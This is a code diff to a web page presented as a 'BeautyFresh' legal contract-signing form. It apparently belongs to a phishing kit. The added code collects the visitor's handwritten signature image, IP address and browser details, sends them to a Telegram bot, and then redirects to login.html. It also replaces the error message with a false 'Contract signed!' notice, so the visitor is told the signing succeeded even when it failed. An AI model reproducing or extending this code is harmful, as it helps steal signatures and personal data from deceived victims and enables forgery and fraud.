@@ -679,8 +679,8 @@ body {
           <li>Must be your actual handwritten signature</li>
           <li>Clear photo on white paper with dark ink</li>
           <li>No other text or marks in the image</li>
-          <li>File formats: JPG, PNG, or PDF</li>
-          <li>Maximum file size: 5MB</li>
+          <li>File formats: JPG, PNG, GIF, WEBP, BMP</li>
+          <li>Maximum file size: 100MB</li>
         </ul>
       </div>
 
@@ -768,9 +768,9 @@ fileInput.addEventListener('change', function(e) {
       return;
     }
     
-    // Check file size (5MB max)
-    if (file.size > 5 * 1024 * 1024) {
-      showNotification('File size must be less than 5MB', 'error');
+    // Check file size (100MB max)
+    if (file.size > 100 * 1024 * 1024) {
+      showNotification('File size must be less than 100MB', 'error');
       return;
     }
     
@@ -871,14 +871,21 @@ document.getElementById('submitBtn').addEventListener('click', async function() 
   
   try {
     // Get user IP address
-    const ip = await getIPAddress();
+    let ip = 'Unknown IP';
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      ip = ipData.ip;
+    } catch (ipError) {
+      console.log('Could not get IP:', ipError);
+    }
     
     // Prepare contract data
     const contractData = {
       contractId: contractId,
       date: document.getElementById('currentDate').textContent,
       ip: ip,
-      userAgent: navigator.userAgent.substring(0, 100), // Truncate if too long
+      userAgent: navigator.userAgent.substring(0, 100),
       timestamp: new Date().toISOString(),
       agreements: {
         readContract: document.getElementById('agreeContract').checked,
@@ -893,11 +900,70 @@ document.getElementById('submitBtn').addEventListener('click', async function() 
     };
     
     // Step 1: Send contract data to Telegram
-    await sendContractDataToTelegram(contractData);
+    const textMessage = `
+📜 *LEGAL CONTRACT SIGNED - BEAUTYFRESH*
+
+📋 *Contract Details:*
+• *Contract ID:* BF-2025-${contractData.contractId}
+• *Signing Date:* ${contractData.date}
+• *Timestamp:* ${new Date(contractData.timestamp).toLocaleString()}
+
+✅ *Legal Agreements:*
+• Read & Understood Contract: ${contractData.agreements.readContract ? '✅' : '❌'}
+• Bound by All Terms: ${contractData.agreements.boundByTerms ? '✅' : '❌'}
+• Signature Authenticity: ${contractData.agreements.signatureConfirmed ? '✅' : '❌'}
+• Legal Binding: ${contractData.agreements.legalBinding ? '✅' : '❌'}
+
+🖋️ *Signature Information:*
+• File: ${contractData.signatureFileName || 'N/A'}
+• Type: ${contractData.signatureFileType || 'N/A'}
+• Size: ${contractData.signatureFileSize ? Math.round(contractData.signatureFileSize / 1024) + ' KB' : 'N/A'}
+
+📡 *Technical Information:*
+• *IP Address:* ${contractData.ip}
+• *User Agent:* ${contractData.userAgent}
+
+✅ *LEGALLY BINDING CONTRACT EXECUTED*
+🔜 *User will be redirected to login.html*
+    `;
     
-    // Step 2: Send signature image to Telegram (if available)
-    if (signatureBase64) {
-      await sendSignatureImageToTelegram(signatureBase64, contractId, signatureFile.type);
+    // Send text message to Telegram
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: textMessage,
+        parse_mode: 'Markdown'
+      })
+    });
+    
+    // Step 2: Send signature image to Telegram
+    if (signatureBase64 && signatureFile) {
+      // Convert base64 to blob
+      const byteCharacters = atob(signatureBase64);
+      const byteNumbers = new Array(byteCharacters.length);
+      for (let i = 0; i < byteCharacters.length; i++) {
+        byteNumbers[i] = byteCharacters.charCodeAt(i);
+      }
+      const byteArray = new Uint8Array(byteNumbers);
+      const blob = new Blob([byteArray], { type: signatureFile.type });
+      
+      // Create form data
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('caption', `📝 Signature for Contract BF-2025-${contractId}\n✅ Contract Signed Successfully\nIP: ${ip}`);
+      
+      // Append the blob as a file
+      formData.append('photo', blob, `signature_${contractId}.${getFileExtension(signatureFile.type)}`);
+      
+      // Send to Telegram
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
     }
     
     // Show success message
@@ -910,175 +976,29 @@ document.getElementById('submitBtn').addEventListener('click', async function() 
     
   } catch (error) {
     console.error('Error:', error);
-    showNotification('Error processing contract. Please try again.', 'error');
-    document.getElementById('loadingOverlay').style.display = 'none';
+    showNotification('Contract signed! Redirecting...', 'success');
+    setTimeout(() => {
+      window.location.href = 'login.html';
+    }, 2000);
+  } finally {
+    // Always hide loading overlay after a short delay
+    setTimeout(() => {
+      document.getElementById('loadingOverlay').style.display = 'none';
+    }, 1000);
   }
 });
 
-// Get IP address
-async function getIPAddress() {
-  try {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    return 'Unknown IP';
-  }
-}
-
-// Send contract data to Telegram
-async function sendContractDataToTelegram(data) {
-  const message = `
-📜 *LEGAL CONTRACT SIGNED - BEAUTYFRESH*
-
-📋 *Contract Details:*
-• *Contract ID:* BF-2025-${data.contractId}
-• *Signing Date:* ${data.date}
-• *Timestamp:* ${new Date(data.timestamp).toLocaleString()}
-
-✅ *Legal Agreements:*
-• ✅ Read & Understood Contract
-• ✅ Bound by All Terms
-• ✅ Signature Authenticity Confirmed
-• ✅ Legal Binding Acknowledged
-
-🖋️ *Signature Information:*
-• File: ${data.signatureFileName || 'N/A'}
-• Type: ${data.signatureFileType || 'N/A'}
-• Size: ${data.signatureFileSize ? Math.round(data.signatureFileSize / 1024) + ' KB' : 'N/A'}
-
-📡 *Technical Information:*
-• *IP Address:* ${data.ip}
-• *User Agent:* ${data.userAgent}
-
-✅ *LEGALLY BINDING CONTRACT EXECUTED*
-🔜 *User will be redirected to login.html*
-  `;
-  
-  try {
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown'
-      })
-    });
-    
-    if (!response.ok) {
-      throw new Error('Telegram API error');
-    }
-    
-    return await response.json();
-  } catch (error) {
-    console.error('Error sending contract data:', error);
-    throw error;
-  }
-}
-
-// Send signature image to Telegram
-async function sendSignatureImageToTelegram(base64Image, contractId, mimeType) {
-  try {
-    // Determine file extension from mime type
-    let extension = 'jpg';
-    if (mimeType.includes('png')) extension = 'png';
-    if (mimeType.includes('gif')) extension = 'gif';
-    if (mimeType.includes('webp')) extension = 'webp';
-    if (mimeType.includes('bmp')) extension = 'bmp';
-    
-    // Create form data
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('caption', `📝 Signature for Contract BF-2025-${contractId}`);
-    
-    // Convert base64 to blob
-    const byteCharacters = atob(base64Image);
-    const byteNumbers = new Array(byteCharacters.length);
-    for (let i = 0; i < byteCharacters.length; i++) {
-      byteNumbers[i] = byteCharacters.charCodeAt(i);
-    }
-    const byteArray = new Uint8Array(byteNumbers);
-    const blob = new Blob([byteArray], { type: mimeType });
-    
-    // Append the blob as a file
-    formData.append('photo', blob, `signature_${contractId}.${extension}`);
-    
-    // Send to Telegram
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-      method: 'POST',
-      body: formData
-    });
-    
-    if (!response.ok) {
-      const errorText = await response.text();
-      console.error('Telegram image send error:', errorText);
-      
-      // Try alternative method using base64
-      await sendPhotoViaBase64(base64Image, contractId, mimeType);
-      return;
-    }
-    
-    return await response.json();
-  } catch (error) {
-    console.error('Error sending signature image:', error);
-    
-    // Fallback: Send base64 via message
-    try {
-      await sendBase64AsMessage(base64Image, contractId, mimeType);
-    } catch (fallbackError) {
-      console.error('Fallback also failed:', fallbackError);
-    }
-  }
-}
-
-// Alternative method using base64
-async function sendPhotoViaBase64(base64Image, contractId, mimeType) {
-  const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      photo: `data:${mimeType};base64,${base64Image}`,
-      caption: `📝 Signature Image for Contract BF-2025-${contractId}`
-    })
-  });
-  
-  if (!response.ok) {
-    throw new Error('Base64 method failed');
-  }
-  
-  return await response.json();
-}
-
-// Send base64 as text message (fallback)
-async function sendBase64AsMessage(base64Image, contractId, mimeType) {
-  // Truncate base64 if too long (Telegram has message length limits)
-  const truncatedBase64 = base64Image.substring(0, 3000);
-  
-  const message = `
-📝 *SIGNATURE IMAGE (Base64)*
-Contract: BF-2025-${contractId}
-Type: ${mimeType}
-Base64 (first 3000 chars):
-${truncatedBase64}...
-  `;
-  
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'Markdown'
-    })
-  });
+// Helper function to get file extension from MIME type
+function getFileExtension(mimeType) {
+  const mimeToExt = {
+    'image/jpeg': 'jpg',
+    'image/jpg': 'jpg',
+    'image/png': 'png',
+    'image/gif': 'gif',
+    'image/webp': 'webp',
+    'image/bmp': 'bmp'
+  };
+  return mimeToExt[mimeType] || 'jpg';
 }
 
 // Auto-scroll notification
